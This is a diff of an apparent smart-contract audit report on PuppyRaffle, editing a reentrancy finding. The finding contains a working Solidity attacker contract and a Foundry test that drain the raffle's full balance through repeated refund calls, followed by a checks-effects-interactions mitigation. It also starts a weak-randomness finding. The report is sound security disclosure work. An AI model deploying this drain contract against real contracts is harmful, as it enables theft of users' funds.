@@ -1,21 +1,19 @@
 ### [H-1] Reentrancy attack in PuppyRaffle::refund allows entrant to drain contract balance
 
-**Description:** The PuppyRaffle::refund function does not follow CEI/FREI-PI and as a result, enables participants to drain the contract balance.
+**Description:** The PuppyRaffle::refund function does not follow CEI/FREI-PI (check effects interactions) and as a result, enables participants to drain the contract balance.
 In the PuppyRaffle::refund function, we first make an external call to the msg.sender address, and only after making that external call, we update the players array.
 
 ```javascript
     function refund(uint256 playerIndex) public {
-        // @audit MEV
-        address playerAddress = players[playerIndex];
-        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
-        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+    address playerAddress = players[playerIndex];
+    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
 
-        // @audit Reentrancy
-        payable(msg.sender).sendValue(entranceFee);
+@>  payable(msg.sender).sendValue(entranceFee);
 
-        players[playerIndex] = address(0);
-        emit RaffleRefunded(playerAddress);
-    }
+@>  players[playerIndex] = address(0);
+    emit RaffleRefunded(playerAddress);
+}
 ```
 
 A player who has entered the raffle could have a fallback/receive function that calls the PuppyRaffle::refund function again and claim another refund. They could continue to cycle this until the contract balance is drained.
@@ -35,40 +33,13 @@ Add the following code to the `PuppyRaffleTest.t.sol` file.
 <summary>PoC</summary>
 
 ```javascript
-     function test_reentrancyRefund() public {
-        address[] memory players = new address[](4);
-        players[0] = playerOne;
-        players[1] = playerTwo;
-        players[2] = playerThree;
-        players[3] = playerFour;
-        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
-
-        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
-        address attackUser = makeAddr("attackUser");
-        vm.deal(attackUser, 1 ether);
-
-        uint256 startingAttackContractBalance = address(attackerContract).balance;
-        uint256 startingContractBalance = address(puppyRaffle).balance;
-
-        // attack
-        vm.prank(attackUser);
-        attackerContract.attack{value: entranceFee}();
-
-        console.log("starting attacker contract balance", startingAttackContractBalance);
-        console.log("starting contract balance: ", startingContractBalance);
-
-        console.log("ending attacker contract balance: ", address(attackerContract).balance);
-        console.log("ending contract balance: ", address(puppyRaffle).balance);
-     }
-
-
 contract ReentrancyAttacker {
-        PuppyRaffle puppyRaffle;
-        uint256 entranceFee;
-        uint256 attackerIndex;
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
 
-    constructor(PuppyRaffle _puppyRaffle) {
-        puppyRaffle = _puppyRaffle;
+    constructor(address _puppyRaffle) {
+        puppyRaffle = PuppyRaffle(_puppyRaffle);
         entranceFee = puppyRaffle.entranceFee();
     }
 
@@ -76,31 +47,35 @@ contract ReentrancyAttacker {
         address[] memory players = new address[](1);
         players[0] = address(this);
         puppyRaffle.enterRaffle{value: entranceFee}(players);
-
         attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
         puppyRaffle.refund(attackerIndex);
     }
 
-    function _stealMoney() internal {
+    fallback() external payable {
         if (address(puppyRaffle).balance >= entranceFee) {
             puppyRaffle.refund(attackerIndex);
         }
     }
-
-    fallback() external payable {
-        _stealMoney();
-    }
-
-    receive() external payable {
-        _stealMoney();
-    }
 }
 
+function testReentrance() public playersEntered {
+    ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
+    vm.deal(address(attacker), 1e18);
+    uint256 startingAttackerBalance = address(attacker).balance;
+    uint256 startingContractBalance = address(puppyRaffle).balance;
+
+    attacker.attack();
+
+    uint256 endingAttackerBalance = address(attacker).balance;
+    uint256 endingContractBalance = address(puppyRaffle).balance;
+    assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
+    assertEq(endingContractBalance, 0);
+}
 ```
 
 </details>
 
-**Recommended Mitigation:** To fix this, we should have the PuppyRaffle::refund function update the players array before making the external call. Additionally, we should move the event emission up as well.
+**Recommended Mitigation:** To fix this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.
 
 ```diff
     function refund(uint256 playerIndex) public {
@@ -114,7 +89,6 @@ contract ReentrancyAttacker {
 -        players[playerIndex] = address(0);
 -        emit RaffleRefunded(playerAddress);
     }
-
 ```
 
 ### [H-2] Weak randomness in PuppyRaffle::selectWinner allows anyone to choose winner
@@ -411,6 +385,7 @@ test this
     function selectWinner() external {
 +       raffleId = raffleId + 1;
         require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
+    }
 ```
 
 3. You could use [OpenZeppelin's `EnumerableSet` library] (https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet)
